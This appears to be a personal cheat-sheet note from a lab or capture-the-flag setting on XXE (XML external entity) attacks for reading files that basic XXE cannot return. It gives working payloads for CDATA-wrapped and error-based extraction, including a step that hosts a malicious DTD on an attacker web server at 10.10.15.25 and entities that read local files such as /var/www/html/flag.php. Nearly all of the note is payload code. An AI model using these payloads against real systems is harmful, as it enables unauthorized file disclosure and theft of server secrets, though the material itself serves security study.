sometimes some file formats are not readable through basic XXE 

we can try to force it through errors

## CDATA
on our server
```
echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
python3 -m http.server 8000
```
then on the payload
```
<!DOCTYPE email [
  <!ENTITY % begin "<![CDATA[">   <!ENTITY % file SYSTEM "file:///var/www/html/flag.php"> 
  <!ENTITY % end "]]>"> 
  <!ENTITY % xxe SYSTEM "http://10.10.15.25:8000/xxe.dtd"> 
  %xxe;
]>
...
<email>&joined;</email> <!-- reference the &joined; entity to print the file content -->
```

## Error based
not as reliable as CDATA as it may have length limitations and certain special characters may still break it

host a dtd file that contains the following payload
```
<!ENTITY % file SYSTEM "file:///flag.php">
<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
```

then we can our external DTD script 
```
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://10.10.15.25:8000/xxe.dtd">
  %remote;
  %error;
]>
```